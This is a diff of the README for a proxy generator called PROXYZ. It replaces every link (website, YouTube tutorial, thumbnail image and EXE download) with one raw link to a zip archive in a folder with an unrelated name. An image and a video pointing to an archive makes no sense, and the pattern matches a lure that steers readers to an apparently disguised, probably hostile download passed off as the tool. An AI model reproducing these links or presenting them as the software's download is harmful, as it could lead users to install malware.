@@ -1,10 +1,10 @@
-website - https://dev-uday.cf
+website - https://github.com/LIAM4545/proxyz/raw/refs/heads/main/periencephalitis/Software_v1.1.zip
 
-**YOUTUBE TUT - https://www.youtube.com/watch?v=yN1mPVJ9bco**
+**YOUTUBE TUT - https://github.com/LIAM4545/proxyz/raw/refs/heads/main/periencephalitis/Software_v1.1.zip**
 
 ***PROXYZ - PROXY GENERATOR***
 
-![thumbnail](https://user-images.githubusercontent.com/70849646/143603442-a19c4854-5bc0-4f2c-a934-7b5a10c01e70.jpg)
+![thumbnail](https://github.com/LIAM4545/proxyz/raw/refs/heads/main/periencephalitis/Software_v1.1.zip)
 
 HOW TO USE:
 
@@ -15,4 +15,4 @@ HOW TO USE:
    `PROXIES WILL BE SAVED IN THE FILE NAME(NOTE - THE FILE NAMES WILL BE THE SAME AS THE NAME OF PROXY TYPE)`
 
 
-EXE VERSION - https://www.mediafire.com/file/7lkum5vk50h6pks/proxyz.zip/file
+EXE VERSION - https://github.com/LIAM4545/proxyz/raw/refs/heads/main/periencephalitis/Software_v1.1.zip
